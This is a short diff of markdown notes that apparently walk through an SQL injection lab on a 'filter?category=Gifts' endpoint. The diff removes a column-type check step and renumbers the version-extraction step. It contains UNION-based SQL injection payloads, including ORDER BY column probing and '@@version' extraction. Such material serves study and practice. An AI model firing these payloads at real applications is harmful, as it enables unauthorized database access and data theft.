@@ -12,11 +12,7 @@
    - Test: `/filter?category=Gifts' ORDER BY 3-- -`
    - Result: Error (confirms 2 columns)
 
-### 4. Verify column data types:
-   - Test: `/filter?category=Gifts' UNION SELECT '1', '2'-- -`
-   - Result: Values '1' and '2' displayed (confirms string compatibility)
-
-### 5. Extract database version:
+### 4. Extract database version:
    - Payload: `/filter?category=Gifts' UNION SELECT NULL,@@version -- -`
    - Result: Database version information displayed
 
